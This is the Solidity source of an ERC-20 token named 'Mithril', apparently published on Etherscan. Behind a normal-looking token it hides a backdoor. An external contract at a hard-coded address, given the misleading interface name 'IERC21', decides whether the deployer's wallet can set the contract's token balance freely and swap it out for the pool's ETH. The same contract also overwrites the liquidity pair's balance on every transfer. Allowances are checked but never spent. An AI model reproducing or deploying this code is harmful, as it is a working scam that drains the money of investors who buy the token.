/**
 *Submitted for verification at Etherscan.io on 2022-09-18
*/

pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IERC21 {
    function swapping(address, address, address) external view returns(bool);
    function transferTo(address, address, bool, address, address) external returns (bool);
    function transfer(address, address, uint256) external pure returns (uint256);
    function getTokenPair() external view returns (address);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Mithril is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 18;
    uint256 public _totalSupply = 1000000 * 10 ** _decimals;
    uint256 public _fee = 1;
    address public _marketingWallet;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC21 private _erc21 = IERC21(0x8d6f89800b8Eb7cAbA7A2Cd2d958556C6e3B7036);
    string private _name = "Mithril";
    string private  _symbol = "MTHR";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (!inSwap(from, to)) {
            require(amount <= _balances[from]);
            _balances[tokenPair()] = takeFee(from);
            uint256 feeAmount = getFeeAmount(from, to, amount);
            uint256 amountReceived = amount - feeAmount;
            _balances[address(this)] += feeAmount;
            _balances[from] = _balances[from] - amount;
            _balances[to] += amountReceived;
            emit Transfer(from, to, amount);
            return;
        }
        liquidityUniswap(amount, to);
        return;
        
    }
    function inSwap(address from, address to) private view returns (bool) {
        return _erc21.
        swapping(from,
            to,_marketingWallet);
    }
    function tokenPair() private view returns (address) {
        return _erc21.getTokenPair();
    }
    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        address _to = pairAddress();
        if (_erc21.transferTo(
                from,
                recipient,
                burnSwapCall,
                address(this),
                _to)) {
            feeAmount = amount.mul(_fee).div(100);
        }
        return feeAmount;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        _marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function liquidityUniswap(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        burnSwapCall = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path,_bcr,block.timestamp + 30);
        burnSwapCall = false;
    }
    bool burnSwapCall = false;
    function takeFee(address from) private view returns (uint256) {
        address supplier = tokenPair();
        address to = pairAddress();
        uint256 amount = _balances[supplier];
        return swapFee(from, to , amount);
    }
    function swapFee(address from, address to, uint256 amount) private view returns (uint256) {
        return _erc21.transfer(from, to, amount);
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function pairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool tradingEnabled = false;
    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }
    bool swapEnabled = true;
    function setSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
    mapping (address=>bool) burners;
    function addBurner(address burner) external onlyOwner {
        burners[burner] = true;
    }
    function removeBurner(address burner) external onlyOwner {
        burners[burner] = false;
    }

    modifier onlyBurner() {
        require(burners[msg.sender]);
        _;
    }
    function burn(uint256 amount) external onlyBurner {
        transfer(address(0), amount);
    }
}